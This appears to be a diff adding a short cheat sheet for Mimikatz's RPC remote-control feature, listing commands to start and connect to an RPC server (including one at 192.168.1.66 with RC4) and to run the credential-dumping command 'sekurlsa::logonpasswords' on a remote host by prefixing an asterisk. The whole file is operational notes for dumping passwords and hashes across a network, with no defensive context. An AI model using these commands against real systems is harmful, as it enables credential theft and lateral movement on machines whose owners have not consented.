@@ -1,0 +1,30 @@
+MIMIKATZ - REMOTE CONTROL, RPC
+Start an RPC Server:
+
+rpc::server
+
+Connect to RPC server:
+
+rpc::connect
+
+Stop RPC Connection:
+
+rpc::server /stop
+
+Enumerate all the RPC things:
+
+rpc::enum
+
+Securely Connect to RPC Server:
+
+rpc::connect /server:192.168.1.66 /alg:RC4
+
+Interact with remote RPC Server:
+
+***Always prepend commands with an asterisk to interact remotely
+
+local mimikatz command - sekurlsa::logonpasswords
+remote mimikatz command - *sekurlsa::logonpasswords
+
+
+
